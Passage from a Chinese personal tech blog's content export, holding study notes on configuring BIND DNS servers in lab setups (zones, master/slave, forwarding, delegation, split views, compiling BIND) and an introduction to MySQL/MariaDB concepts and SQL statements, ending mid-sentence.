架设好DNS服务器后，都需要进行测试，所以这里需要有客户端进行配置好。\n/etc/hosts #这个是最早的 hostname 对应 IP 的档案； /etc/resolv.conf #这个重要！就是 ISP 的 DNS 服务器 IP 记录处； /etc/nsswitch.conf #这个档案则是在『决定』先要使用 /etc/hosts 还是 /etc/resolv.conf 的设定！ ]$ vim /etc/resolv.conf nameserver DNS_IP #供实验的DNSip地址,一定是第一个 nameserver 8.8.8.8 nameserver 223.5.5.5 nameserver 223.6.6.6 rndc命令 rndc \u0026mdash;\u0026gt; rndc(953/tcp)\n]$ rndc status version: 9.9.4-RedHat-9.9.4-61.el7 id:8f9657aa CPUs found: 1 worker threads: 1 UDP listeners per interface: 1 number of zones: 103 debug level: 0 xfers running: 0 xfers deferred: 0 soa queries in progress: 0 query logging is OFF recursive clients: 0/0/1000 tcp clients: 0/100 server is up and running  reload: 重载主配置文件和区域解析库文件 reload zonename: 重载区域解析库文件 retransfer zonename: 手动启动区域传送，而不管序列号是否增加 notify zonename: 重新对区域传送发通知 reconfig: 重载主配置文件 querylog: 开启或关闭查询日志文件/var/log/message trace: 递增debug一个级别 trace LEVEL: 指定使用的级别 notrace：将调试级别设置为 0 flush：清空DNS服务器的所有缓存记录  实验1.实现www.feng.com正向反向DNS配置 在服务器上进行配置/etc/named.conf ]$ vim /etc/named.conf options { listen-on port 53 { localhost; }; #允许localhost连接named进程 listen-on-v6 port 53 { ::1; }; directory \u0026quot;/var/named\u0026quot;;\t#named家目录 dump-file \u0026quot;/var/named/data/cache_dump.db\u0026quot;; statistics-file \u0026quot;/var/named/data/named_stats.txt\u0026quot;; memstatistics-file \u0026quot;/var/named/data/named_mem_stats.txt\u0026quot;; allow-query { localhost;any; };\t#允许any所有的client进行DNS解析服务 allow-transfer { none;};\t#禁止任何人转发 ··· include \u0026quot;/etc/named.rfc1912.zones\u0026quot;; #当然，zone文件也可以放在.conf文件里面。 include \u0026quot;/etc/named.root.key\u0026quot;; 配置/etc/named.rfc1912.zones文件 ]$ vim /etc/named.rfc1912.zones #加入两条正向反向解析的域名 zone \u0026quot;feng.com\u0026quot; IN { type master; file \u0026quot;feng.com.zone\u0026quot;; }; zone \u0026quot;1.168.192.in-addr.arpa\u0026quot; IN { type master; file \u0026quot;192.168.1.zone\u0026quot;; }; 解析域zone文件的配置 ]$ touch /var/named/{feng.com.zone,192.168.1.zone} #建立两套解析域资源 ]$ chgrp named /var/named/{feng.com.zone,192.168.1.zone} #改变文件的属组 ]$ chmod 640 /var/named/{feng.com.zone,192.168.1.zone} #改变文件的权限 ]$ vim /var/named/192.168.1.zone $TTL 1D @ IN SOA dns1.feng.com. admin.feng.com. ( 1 1D 1H 1W 3H ) NS dns1.feng.com. dns1.feng.com. A 192.168.1.9 8 PTR websrv.feng.com. 6 PTR appsrv.feng.com. 100 PTR mailsrv.feng.com. $ vim /var/named/feng.com.zone $TTL 1D @ IN SOA dns1.feng.com. admin.feng.com. ( 1 1D 1H 1W 3H ) NS dns1.feng.com. dns1 A 192.168.1.9 websrv\tA 192.168.1.10 websrv\tA 192.168.1.11 www\tCNAME websrv ]$ systemctl start named #至此，DNS正向反向解析库配置完成，客户端使用dig即可完成DNS解析。 实验2.实现DNS的主从服务器配置 要点：\n1、应该为一台独立的名称服务器 2、主服务器的区域解析库文件中必须有一条NS记录指向从服务器 3、从服务器只需要定义区域，而无须提供解析库文件；解析库文件应该放置于/var/named/slaves/目录中 4、主服务器得允许从服务器作区域传送 5、主从服务器时间应该同步，可通过ntp进行； 6、bind程序的版本应该保持一致；否则，应该从高，主低\n从服务器配置： #主服务器的主配置文件options中 (影响全局，若只影响局部，可以在/etc/named.rfc1912.zones添加)： ]$ vim /etc/named.conf listen-on port 53 { localhost; }; allow-query { localhost;any; };\tallow-transfer { 192.168.1.8; }; #只允许slave_ip传输 ]$ vim /etc/named.rfc1912.zones zone \u0026quot;feng.com\u0026quot; IN { type master; file \u0026quot;feng.com.zone\u0026quot;; }; ]$ vim /var/named/feng.com.zone $TTL 1D @ IN SOA dns1.feng.com. admin.feng.com. ( 1 1D 1H 1W 3H ) NS dns1.feng.com. NS\tdns2.feng.com. dns1 A 192.168.1.9 dns2\tA\t192.168.1.8 websrv\tA 192.168.1.10 websrv\tA 192.168.1.11 www\tCNAME websrv ]$ chmod 640 /var/named/feng.com.zone ]$ chgrp named /var/named/feng.com.zone ]$ systemctl start named #配置完毕，启动服务 从服务器： $vim /etc/named.conf options { listen-on port 53 { localhost; }; allow-query { localhost;any; };\tallow-transfer { none;}; ··· }; ]$ vim /etc/named.rfc1912.zones zone \u0026quot;ZONE_NAME\u0026quot; IN { type slave; masters { 192.168.1.9; }; file \u0026quot;slaves/feng.com.zone\u0026quot;; }; ]$ systemctl start named ]$ ll /var/named/slaves/ #重启服务后立即生成配置的文件 total 4 -rw-r--r-- 1 named named 415 Jun 3 13:32 feng.com.zone 实验3.实现DNS的转发 中间DNS服务器192.168.1.8(全局/局部)\noptions { ··· listen-on port 53 { localhost; }; allow-query { localhost;any; };\tforward first|only; #first首先转发forward IP;only只转发forward IP; forwarders { 192.168.1.9;}; ··· dnssec-enable no; dnssec-validation no; #关闭dnssec功能 中间DNS服务器(局部域名转发) zone \u0026quot;feng.com\u0026quot; IN { type forward; forward first|only; forwarders { 192.168.1.9;}; }; 192.168.1.9的DNS正向服务器解析配置参照实验1配置即可。 实验4.子域的配置 三种方法：\n 当成父域的一条记录 子域，本机的独立域名 委派给另一台主机维护子域(主要应用)  父域：192.168.1.9 www.feng.com 子域：192.168.1.8 www.bj.feng.com\n]$ vim /etc/named.conf listen-on port 53 { localhost; }; allow-query { localhost;any; };\tdnssec-enable no; dnssec-validation no; #关闭dnssec功能 ··· ]$ vim /etc/named.rfc1912.zones zone \u0026quot;feng.com\u0026quot; IN { type master; file \u0026quot;feng.com.zone\u0026quot;; }; ]$ vim /var/named/feng.com.zone $TTL 86400 @ IN SOA dns1.feng.com. admin.feng.com. (1 1D 2H 1W 3H) NS dns1.feng.com. bj NS dns2.feng.com. ##增加这条ns\tsh NS dns3.feng.com. dns1 A 192.168.1.9 dns2 A 192.168.1.8 ##增加这条A记录 dns3 A 192.168.1.7 ]$ systemctl start named #配置完毕，启动服务  在子域192.168.1.8配置bj.feng.com域名即可 在子域192.168.1.7配置sh.feng.com域名即可，参照实验1即可  实验5.实现智能DNS 需求：\n 192.168.1.0/24 本地的网段访问www.feng.com的时候，DNS解析为192.168.1.10 非192.168.1.0/24 外部的网段访问www.feng.com的时候，DNS解析为192.168.1.11  注意：\n view语句块必须包含所有的zone，所有需要把.(root)域转移到/etc/named.rfc1912.zones。进行模块化的管理。  实验DNS服务器：192.168.1.9/24 ; 172.20.1.24/16\n/etc/named.conf文件配置 ]$ vim /etc/named.conf acl bjnet { 192.168.1.0/24;}; acl othernet {!192.168.1.0/24;any;}; /* zone \u0026quot;.\u0026quot; IN { type hint; file \u0026quot;named.ca\u0026quot;; }; */ view \u0026quot;bjnet\u0026quot; { match-clients {\u0026quot;bjnet\u0026quot;;}; include \u0026quot;/etc/named.rfc1912.zones.bj\u0026quot;; }; view \u0026quot;othernet\u0026quot; { match-clients {\u0026quot;othernet\u0026quot;;}; include \u0026quot;/etc/named.rfc1912.zones\u0026quot;; }; // include \u0026quot;/etc/named.rfc1912.zones\u0026quot;; 配置zone文件 ]$ cp -p /etc/named.rfc1912.zones /etc/named.rfc1912.zones.bj ]$ vim /etc/named.rfc1912.zones.bj zone \u0026quot;.\u0026quot; IN { type hint; file \u0026quot;named.ca\u0026quot;; }; zone \u0026quot;feng.com\u0026quot; IN { type master; file \u0026quot;feng.com.zone.bj\u0026quot;; }; $vim /etc/named.rfc1912.zones zone \u0026quot;.\u0026quot; IN { type hint; file \u0026quot;named.ca\u0026quot;; }; zone \u0026quot;feng.com\u0026quot; IN { tpye master; file \u0026quot;feng.com.zone\u0026quot;; }; 数据库文件配置 ]$ vim /var/named/feng.com.zone $TTL 1D @ IN SOA dns1.feng.com. admin.feng.com. ( 1 1D 1H 1W 3H ) NS dns1.feng.com. dns1 A 192.168.1.9 websrv\tA 192.168.1.10 www\tCNAME websrv ]$ vim /var/named/feng.com.zone.bj $TTL 1D @ IN SOA dns1.feng.com. admin.feng.com. ( 1 1D 1H 1W 3H ) NS dns1.feng.com. dns1 A 192.168.1.9 websrv\tA 192.168.1.11 www\tCNAME websrv ]$ systemctl start named #配置好，启动服务 实验6.搭建互联网模型的dns 场景:.(root)服务器,com.服务器,feng.com服务器,www.feng.com主机,电信转发服务器,clinets\n主机：centos7.4 .(root):192.168.1.1 com.:192.168.1.2 feng.com.:192.168.1.3 从：192.168.1.33 高可用 www.feng.com.: 192.168.1.4 负载均衡备用主机：192.168.1.44 DNStrans:192.168.1.5 clients：192.168.1.6 实验综合条件：每台dns服务器的要求  关闭防火墙 selinux策略为disabled 安装好bind服务  ]$ getenforce Disabled ]$ systemctl stop firewalld ]$ yum install bind -y ]$ rpm -qf /usr/sbin/named bind-9.8.2-0.62.rc1.el6.x86_64 根服务器的配置 ip为：192.168.1.1\n]$ vim /etc/named.conf listen-on port 53 { localhost; }; allow-query { localhost;any; };\tdnssec-enable no; dnssec-validation no; #关闭dnssec功能，需要委派 ··· /* zone \u0026quot;.\u0026quot; IN { tpye hint; file \u0026quot;named.ca\u0026quot;; }; */ ]$ vim /etc/named.rfc1912.zones zone \u0026quot;.\u0026quot; IN { type master; file \u0026quot;root.zone\u0026quot;; }; ]$ vim /var/named/root.zone $TTL 86400 @ IN SOA dns1. admin. (1 1D 2H 1W 3H) NS dns1 com\tNS\tdns2\t#委派子域com. dns1\tA\t192.168.1.1 dns2\tA\t192.168.1.2 $systemctl start named #配置完毕，启动服务 搭建区域dns服务器 ip为192.168.1.5\n]$ vim /etc/named.conf listen-on port 53 { localhost; }; allow-query { localhost;any; };\tdnssec-enable no; dnssec-validation no; #关闭dnssec功能，需要转发 ··· ]$ vim /var/named/named.ca .\t518400\tIN\tNS\ta.root-servers.net. a.root-servers.net. 3600000 IN A 192.168.1.1 #把CDN服务器指向已经搭好的根服务器IP ]$ systemctl start named 搭建com.服务器： IP为192.168.1.2\n]$ vim /etc/named.conf listen-on port 53 { localhost; }; allow-query { localhost;any; };\tdnssec-enable no; dnssec-validation no; #关闭dnssec功能，需要委派 ]$ vim /etc/named.rfc1912.zones zone \u0026quot;com\u0026quot; IN { type master; file \u0026quot;com.zone\u0026quot; }; ]$ vim /var/named/com.zone $TTL 86400 @ IN SOA dns1.com. admin.com. (1 1D 2H 1W 3H) NS dns1 feng\tNS\tdns2\t#委派子域feng.com. feng\tNS\tdns3 dns1\tA\t192.168.1.2 dns2\tA\t192.168.1.3 dns3\tA\t192.168.1.33 $systemctl start named 搭建feng.com.服务器 主：192.168.1.3 从：192.168.1.33\n主服务器配置； ]$ vim /etc/named.conf listen-on port 53 { localhost; }; allow-query { localhost;any; };\tallow-transfer { 192.168.1.33; }; #只允许slave_ip传输 ]$ vim /etc/named.rfc1912.zones zone \u0026quot;feng.com\u0026quot; IN { type master; file \u0026quot;feng.com.zone\u0026quot;; }; ]$ vim /var/named/feng.com.zone $TTL 1D @ IN SOA dns1.feng.com. admin.feng.com. ( 1 1D 1H 1W 3H ) NS dns1.feng.com. NS\tdns2.feng.com. dns1 A 192.168.1.3 dns2\tA\t192.168.1.33 websrv\tA 192.168.1.4 websrv\tA 192.168.1.44 www\tCNAME websrv ]$ systemctl start named 从服务器配置； ]$ vim /etc/named.conf options { listen-on port 53 { localhost; }; allow-query { localhost;any; };\tallow-transfer { none;}; ··· }; ]$ vim /etc/named.rfc1912.zones zone \u0026quot;ZONE_NAME\u0026quot; IN { type slave; masters { 192.168.1.3; }; file \u0026quot;slaves/feng.com.zone\u0026quot;; }; ]$ systemctl start named ]$ ll /var/named/slaves/ #重启服务后立即生成配置的文件 total 4 -rw-r--r-- 1 named named 415 Jun 3 13:32 feng.com.zone 5.搭建www.feng.com 主：192.168.1.4 备：192.168.1.44\n192.168.1.4主机： ]$ yum install httpd -y ]$ setenforce 0 ]$ echo welcome to testsrv1 \u0026gt;\u0026gt; /var/www/html/index.html ]$ systemctl start httpd ]$ systemctl stop firewalld 192.168.1.44备用机： ]$ yum install httpd -y ]$ setenforce 0 ]$ echo welcome to testsrv2 \u0026gt;\u0026gt; /var/www/html/index.html ]$ systemctl start httpd ]$ systemctl stop firewalld 6.clients访问 dig或者host命令是bind包\n]$ rpm -qf /usr/bin/dig bind-utils-9.9.4-61.el7.x86_64 ]$ rpm -q bind \u0026amp;\u0026gt; /dev/null || yum install -y bind ]$ dig www.feng.com @192.168.1.5 ]$ host www.feng.com 192.168.1.5 ]$ vim /etc/resolv.conf nameserver 192.168.1.5 ]$ for i in {1..20} ;do curl www.feng.com ;done welcome to testsrv1 welcome to testsrv2 welcome to testsrv1 welcome to testsrv2 welcome to testsrv1 welcome to testsrv2 welcome to testsrv1 welcome to testsrv2 welcome to testsrv1 welcome to testsrv2 welcome to testsrv1 welcome to testsrv2 welcome to testsrv1 welcome to testsrv2 welcome to testsrv1 welcome to testsrv2 welcome to testsrv1 welcome to testsrv2 welcome to testsrv1 welcome to testsrv2 自此，实现了互联网的DNS负载均衡。\n编译安装bind 编译安装bind及启动rndc服务DNS服务 目标：\n 开启dns服务，启用rndc服务  编译前准备 ]$ yum groupinstall \u0026quot;devlopment tools\u0026quot; ]$ yum install openssl-devel -y ]$ useradd -r -d /var/named -u 25 -s /sbin/nologin -m named ]$ ./configrue --prefix=/app/bind 编译 ]$ make -j 4 \u0026amp;\u0026amp; make install ]$ vim /etc/profile.d/bind.sh PATH=/app/bind/bin:/app/bind/sbin:$PATH 修改相关配置文件 ]$ vim /app/bind/etc/named.conf options { directory \u0026quot;/var/named\u0026quot;; }; zone \u0026quot;feng.com\u0026quot; { type master; file \u0026quot;feng.com.zone\u0026quot;; }; zone \u0026quot;.\u0026quot; { type hint; file \u0026quot;named.ca\u0026quot;; }; ]$ chgrp named /app/bind/etc/named.conf ]$ chmod 640 /app/bind/etc/named.conf ]$ mkdir /var/named/ ]$ dig -t ns . @a.root-servers.net \u0026gt; /var/named/named.ca 修改zone文件，配置dns服务 ]$ vim /var/named/feng.com.zone $TTL 1D @ IN SOA dns1.feng.com. admin.feng.com. ( 1 1D 1H 1W 3H ) NS dns1 dns1 A 192.168.1.9 websrv\tA 192.168.1.10 websrv\tA 192.168.1.11 www\tCNAME websrv ]$ named -u named -g -d 3 ]$ named -u named -d 3 #dns基本配置完成，后台启用服务 ]$ rndc-confgen \u0026gt; /app/bind/etc/rndc.conf ]$ grep '^#' /app/bind/etc/rndc.conf \u0026gt;\u0026gt; /app/bind/etc/named.conf ]$ vim /app/bind/etc/named.conf #去掉rndc配置的相关的#号 key \u0026quot;rndc-key\u0026quot; { algorithm hmac-sha256; secret \u0026quot;sTvCPeQfkCmaObjPsnXXpqqryxkse4EmWUQylO4Wl5M=\u0026quot;; }; controls { inet 127.0.0.1 port 953 allow { 127.0.0.1; } keys { \u0026quot;rndc-key\u0026quot;; }; }; ]$ killall -HUP named #重新加载配置文件,dns服务重启成功 querperf测试 编译querperf ]$ cd /root/bind-9.13.0/contrib/queryperf ]$ ./configure ]$ make ]$ cp queryperf /app/bind/bin/ ]$ vim /root/dnstest.txt 测试 www.feng.com A feng.com NS feng.com SOA feng.com MX ]$ cat \u0026gt;\u0026gt; /root/dnstest.txt \u0026lt; /root/dnstest.txt #生成大文件 ]$ sed -i '100000,$d' /root/dnstest.txt #取前100000行 ]$ queryperf -d /root/dnstest.txt Statistics: Parse input file: once Ended due to: reaching end of file Queries sent: 4055040 queries Queries completed: 4055040 queries Queries lost: 0 queries Queries delayed(?): 0 queries RTT max: 1.629313 sec RTT min: 0.000057 sec RTT average: 0.004647 sec RTT std deviation: 0.008495 sec RTT out of range: 0 queries Percentage completed: 100.00% Percentage lost: 0.00% Started at: Sat Jun 2 23:03:40 2018 Finished at: Sat Jun 2 23:19:26 2018 Ran for: 945.913922 seconds Queries per second: 4286.901700 qps 以上内容为学习过程\n","permalink":"https://www.fenghong.tech/blog/2018/2018-06-10-dns/","tags":["DNS"],"title":"DNS服务"},{"categories":["mysql"],"contents":"数据库基础 传统的文件系统管理的缺陷 编写应用程序不方便； 数据冗余不可避免； 应用程序依赖性； 不支持对文件的并发访问； 数据间联系弱； 难以按用户视图表示数据； 无阶段性安全控制功能.\n数据库管理系统的优点 相互关联的数据的集合； 较少的数据冗余； 程序与数据相互独立； 保证数据的安全、可靠； 最大限度地保证数据的正确性； 数据可以并发使用并能同时保证一致性.\n数据库管理系统 数据库是数据的汇集，它以一定的组织形式存于存储介质上 DBMS是管理数据库的系统软件，它实现数据库系统的各种功能。是数据库系统的核心 DBA：负责数据库的规划、设计、协调、维护和管理等工作 应用程序指以数据库为基础的应用程序;\n单机架构; 大型主机/终端架构; 主从分布式(C/S); MYSQL,ORICAL 分布式架构;\n关系型数据Key/Value 数据库 关系 ：关系就是二维表。并满足如下性质： 表中的行、列次序并不重要 行row：表中的每一行，又称为一条记录(record) 列column：表中的每一列，称为属性，字段 主键（Primary key）：用于惟一确定一个记录的字段 域domain：属性的取值范围，如，性别只能是‘男’和‘女’两个值 外键（Foreign key):用于表之间的一对多的关系 唯一键(Uniq key):可以为null， 非关系型数据库：NO SQL (not only SQL) mencached redis\tmogoDB RDBMS： MySQL: MySQL, MariaDB, Percona Server PostgreSQL: 简称为pgsql，EnterpriseDB Oracle： MSSQL： DB2: 事务tansaction：多个操作被当作一个整体对待 ACID: A:原子性 C:一致性 I:隔离性 D:持久性 事务未撤销，形成的数据为:dirty data\n数据三要素 数据结构：\n​\t一类是与数据类型、内容、性质有关的对象，比如关系模型中的域、属性和关系等； 另一类是与数据之间联系有关的对象，它从数据组织层表达数据记录与字段的结构\n数据的操作：\n​\t数据提取：在数据集合中提取感兴趣的内容。SELECT 数据更新：变更数据库中的数据。INSERT、DELETE、UPDATE\n数据的约束条件 ： 是一组完整性规则的集合：\n​\t实体(行)完整性 Entity integrity 域(列)完整性 Domain Integrity 参考完整性 Referential Integrity\n数据库的正规化分析 RDMBS设计范式基础概念\u0026mdash;物理层\n​\t设计关系数据库时，遵从不同的规范要求，设计出合理的关系型数据库，这些不同的规范要求被称为不同范式，各种范式呈递次规范，越高的范式数据库冗余越小\n目前关系数据库有六种范式：\u0026mdash;逻辑层\n​\t第一范式（1NF）、第二范式（2NF）、第三范式（3NF）、巴德斯科范式（BCNF）、第四范式(4NF）和第五范式（5NF，又称完美范式）。满足最低要求的范式是第一范式（1NF）。在第一范式的基础上进一步满足更多规范要求的称为第二范式（2NF），其余范式以次类推。一般说来，数据库只需满足第三范式(3NF）即可 范式 1NF：无重复的列，每一列都是不可分割的基本数据项，同一列中不能有多个值，即实体中的某个属性不能有多个值或者不能有重复的属性。除去同类型的字段，就是无重复的列 说明：第一范式（1NF）是对关系模式的基本要求，不满足第一范式（1NF）的数据库就不是关系数据库;\n​\t2NF：属性完全依赖于主键，第二范式必须先满足第一范式，要求表中的每个行必须可以被唯一地区分。通常为表加上一个列，以存储各个实例的唯一标识PK，非PK的字段需要与整个PK有直接相关性;\n​\t3NF：属性不依赖于其它非主属性，满足第三范式必须先满足第二范式。第三范式要求一个数据库表中不包含已在其它表中已包含的非主关键字信息，非PK的字段间不能有从属关系; 为了性能，某些数据库不满足范式，增加了数据库的冗余.\nMYSQL概念 历史发展 1979年：TcX公司 Monty Widenius，Unireg 1996年：发布MySQL1.0，Solaris版本，Linux版本 1999年：MySQL AB公司，瑞典 2003年：MySQL 5.0版本，提供视图、存储过程等功能 2008年：Sun 收购 2009年：Oracle收购sun 2009年：Monty成立MariaDB\n启动MariaDB服务 初识数据库 $systemctl start mariadb $mysql MariaDB [(none)]\u0026gt;drop database test; #删除数据库test MariaDB [(none)]\u0026gt;use mysql; MariaDB [mysql]\u0026gt; status MariaDB [mysql]\u0026gt; create database testdb; Query OK, 1 row affected (0.00 sec) MariaDB [mysql]\u0026gt; \\! ls /var/lib/mysql MariaDB [mysql]\u0026gt; SELECT user,password,host FROM user; $mysql_secure_installation\t#设置mysql密码 $mysql -uroot -p #输入密码 MariaDB [mysql]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | +--------------------+ MariaDB [mysql]\u0026gt; SELECT user,host,password FROM user; MariaDB [mysql]\u0026gt; SELECT * FROM user\\G; MariaDB [mysql]\u0026gt;quit 交互式命令\n可以接受输入重定向。可以source\n$mysql -uroot -proot \u0026lt; test.sql MariaDB [(none)]\u0026gt; source test.sql 客户端命令\n可以不用加\u0026rdquo;;\u0026ldquo;结束语句\nNote that all text commands must be first on line and end with ';' ? (\\?) Synonym for `help'. clear (\\c) Clear the current input statement. connect (\\r) Reconnect to the server. Optional arguments are db and host. delimiter (\\d) Set statement delimiter. edit (\\e) Edit command with $EDITOR. ego (\\G) Send command to mysql server, display result vertically. exit (\\q) Exit mysql. Same as quit. go (\\g) Send command to mysql server. help (\\h) Display this help. nopager (\\n) Disable pager, print to stdout. notee (\\t) Don't write into outfile. pager (\\P) Set PAGER [to_pager]. Print the query results via PAGER. print (\\p) Print current command. prompt (\\R) Change your mysql prompt. quit (\\q) Quit mysql. rehash (\\#) Rebuild completion hash. source (\\.) Execute an SQL script file. Takes a file name as an argument. status (\\s) Get status information FROM the server. system (\\!) Execute a system shell command. tee (\\T) Set outfile [to_outfile]. Append everything into given outfile. use (\\u) Use another database. Takes database name as argument. charset (\\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets. warnings (\\W) Show warnings after every statement. nowarning (\\w) Don't show warnings after every statement. 修改MariaDB环境变量 shell的环境变量； $vim /etc/profile.d/mysql.sh export MYSQL_PS1=\u0026quot;(\\u@\\h) [\\d]\u0026gt; \u0026quot; $. /etc/profile.d/mysql.sh 命令行的选项改变mariadb_PS1; MariaDB [(none)]\u0026gt; prompt \\u@[\\D]---\u0026gt; PROMPT set to '\\u@[\\D]---\u0026gt;' root@[Mon Jun 4 23:08:30 2018]---\u0026gt; $mysql --prompt=\u0026quot;(\\u@\\h) [\\d]\u0026gt; \u0026quot; /etc/my.cnf.d/mysql-clients.cnf的文件修改  $vim /etc/my.cnf.d/mysql-clients.cnf [mysql] prompt=(\\\\u@\\\\h) [\\\\d]\u0026gt;\\\\_ Mysql客户端选项 mysql客户端可用选项： -A, --no-auto-rehash 禁止补全 -u, --user= 用户名,默认为root -h, --host= 服务器主机,默认为localhost -p, --passowrd= 用户密码,建议使用-p,默认为空密码 -P, --port= 服务器端口 -S, --socket= 指定连接socket文件路径 -D, --database= 指定默认数据库 -C, --compress 启用压缩 -e \u0026quot;SQL\u0026quot; 执行SQL命令 -V, --version 显示版本 -v --verbose 显示详细信息 --print-defaults 获取程序默认使用的配置 $mysql -e \u0026quot;show databases;\u0026quot; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | test | +--------------------+ 数据库操作 SQL规范  在数据库系统中，SQL语句不区分大小写(建议用大写) 但字符串常量区分大小写 SQL语句可单行或多行书写，以“;”结尾 关键词不能跨多行或简写 用空格和缩进来提高语句的可读性 子句通常位于独立行，便于编辑，提高可读性 注释： SQL标准： /注释内容/ 多行注释 \u0026ndash; 注释内容 单行注释，注意有空格 MySQL注释：#  数据库的组件(对象)： 数据库、表、索引、视图、用户、存储过程、函数、触发器、事件调度器等\n 命名规则： 必须以字母开头 可包括数字和三个特殊字符（# _ $） 不要使用MySQL的保留字 同一database(Schema)下的对象不能同名  数据库操作 创建数据库：\nCREATE DATABASE|SCHEMA [IF NOT EXISTS] 'DB_NAME'; CHARACTER SET 'character set name' COLLATE 'collate name' 删除数据库\nDROP DATABASE|SCHEMA [IF EXISTS] 'DB_NAME';\n 查看支持所有字符集： SHOW CHARACTER SET; 查看支持所有排序规则： SHOW COLLATION; 获取命令使用帮助： mysql\u0026gt; HELP KEYWORD; 查看数据库列表： mysql\u0026gt; SHOW DATABASES; 例如：  MariaDB [(none)]\u0026gt; \\! ls /var/lib/mysql aria_log.00000001 aria_log_control ibdata1 ib_logfile0 ib_logfile1\tmysql mysql.sock performance_schema test MariaDB [(none)]\u0026gt; CRAETE DATABASE DB1; MariaDB [(none)]\u0026gt; \\! cat /var/lib/mysql/DB1/db.opt default-character-set=latin1 default-collation=latin1_swedish_ci MariaDB [(none)]\u0026gt; SHOW CHARACTER SET; #排序规则 MariaDB [(none)]\u0026gt; DROP DATABASE DB1;\t#删除数据库DB1 MariaDB [(none)]\u0026gt; USE DB1 Database changed MariaDB [DB1]\u0026gt; SHOW TABLES; Empty set (0.00 sec) create database sytanx\n表的操作 选择正确的数据类型对于获得高性能至关重要，三大原则：\n 更小的通常更好，尽量使用可正确存储数据的最小数据类型 简单就好，简单数据类型的操作通常需要更少的CPU周期 尽量避免NULL，包含为NULL的列，对MySQL更难优化  表操作\n 查看所有的引擎：SHOW ENGINES 查看表：SHOW TABLES [FROM db_name] 查看表结构：DESC [db_name.]tb_name 删除表：DROP TABLE [IF EXISTS] tb_name 查看表创建命令：SHOW CREATE TABLE tbl_name 查看表状态：SHOW TABLE STATUS LIKE 'tbl_name' 查看库中所有表状态： SHOW TABLE STATUS FROM db_name 修改表：不建议修改，修改请备份  MariaDB [DB1]\u0026gt; create table student ( id tinyint unsigned not null primary key,name char(10) not null, phone char(11),sex char(1) ); MariaDB [DB1]\u0026gt; desc student; MariaDB [DB1]\u0026gt; show table status like 'student'\\G; MariaDB [DB1]\u0026gt; create table emp ( id int unsigned auto_increment primary key, name varchar(30) not null, sex char(1) default 'm', addresss varchar(100) ) engine=innodb default charset=utf8; Query OK, 0 rows affected (0.01 sec) MariaDB [DB1]\u0026gt; show create table emp\\G; MariaDB [DB1]\u0026gt; create table user SELECT user,host,password FROM mysql.user; MariaDB [DB1]\u0026gt; create table user2 SELECT user,host,password FROM mysql.user where 1 = 0; MariaDB [DB1]\u0026gt; create table user3 like mysql.user; MariaDB [DB1]\u0026gt; desc user2;   set 多选\n  enum 二选一\n  primary key\n主键绑定name,city;\nMariaDB [DB1]\u0026gt; create table t1 ( name char(30),city char(30), sex char(1),primary key(name,city));\n  DML语句  DML（Data Manipulation Language，数据操纵语言） 用来查询或者变更 表中的记录。DML 包含以下几种指令。 SELECT：查询表中的数据 INSERT：向表中插入新数据 UPDATE：更新表中的数据 DELETE：删除表中的数据\n insert MariaDB [DB1]\u0026gt; insert student values(1,'bai','10086','m'); MariaDB [DB1]\u0026gt; insert student(id,name) values(70,'wang'); MariaDB [DB1]\u0026gt; insert student(id,name,sex) values(2,'wang','m'),(3,'lin','f'); MariaDB [DB1]\u0026gt; insert student set id=4,name='zhao'; MariaDB [DB1]\u0026gt; insert emp(name,addresss) SELECT user,host FROM user; update MariaDB [DB1]\u0026gt; update emp set name='admin',addresss='beijing' where id=1; MariaDB [DB1]\u0026gt; update emp set name='admin',addresss='beijing' where name='root' LIMIT 2; delete:慎用 MariaDB [DB1]\u0026gt; truncate table emp; MariaDB [DB1]\u0026gt; delete FROM emp where id=4; mysql -U 安全模式 $ vim /etc/my.cnf/mysql-clients.cnf [mysql] safe-updates DQL语句  DDL（Data Definition Language，数据定义语言） 用来创建或者删除存储 数据用的数据库以及数据库中的表等对象。DDL 包含以下几种指令。 CREATE：创建数据库和表等对象 DROP： 删除数据库和表等对象 ALTER： 修改数据库和表等对象的结构\n SELECT 磁盘的数据排放形式来SELECT\nsyntax:\nSELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] SELECT_expr [, SELECT_expr ...] [FROM table_references [WHERE where_condition] [GROUP BY {col_name | expr | position} [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY {col_name | expr | position} [ASC | DESC], ...] [LIMIT {[offset,] row_count | row_count OFFSET offset}] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE 'file_name' [CHARACTER SET charset_name] export_options | INTO DUMPFILE 'file_name' | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]]   单表操作 MariaDB [DB1]\u0026gt; SELECT 'hello world'; +-------------+ | hello world | +-------------+ | hello world | +-------------+ MariaDB [DB1]\u0026gt; SELECT '1+2',1+2 ; +-----+-----+ | 1+2 | 1+2 | +-----+-----+ | 1+2 | 3 | +-----+-----+ where子句 MariaDB [DB1]\u0026gt; SELECT * FROM user where host='localhost'; MariaDB [DB1]\u0026gt; SELECT * FROM student where sex is null; MariaDB [DB1]\u0026gt; SELECT * FROM student where id \u0026gt;=2 and id \u0026lt;=5; MariaDB [DB1]\u0026gt; SELECT * FROM student where sex in ('f','m'); MariaDB [DB1]\u0026gt; SELECT * FROM student where sex in ('f','m') or sex is null; MariaDB [DB1]\u0026gt; SELECT id as 编号,name 姓名 FROM student where sex in ('f','m') or sex is null;\t#别名   where子句模糊查询\n %：任意长度的任意字符 _：任意单个字符    RLIKE：正则表达式，索引失效，不建议使用\n  REGEXP：匹配字符串可用正则表达式书写模式，同上\n  逻辑操作符：\n NOT：!= AND: OR XOR    group\norder by\n 升序：ASC 降序:DESC  MariaDB [DB1]\u0026gt; SELECT * FROM student order by score ; MariaDB [DB1]\u0026gt; SELECT * FROM student order by -score desc; MariaDB [DB1]\u0026gt; SELECT * FROM student order by score LIMIT 3 ;   FOR UPDATE\n  LOCK IN SHARE MODE\n  SQL JOINS   LEFT OUTER JOIN\n  ringt outer join\n  full join\n  多表查询\nMariaDB [hellodb]\u0026gt; SELECT s.name as s_name,t.name as t_name FROM students as s INNER JOIN teachers as t on s.teacherid=t.tid; MariaDB 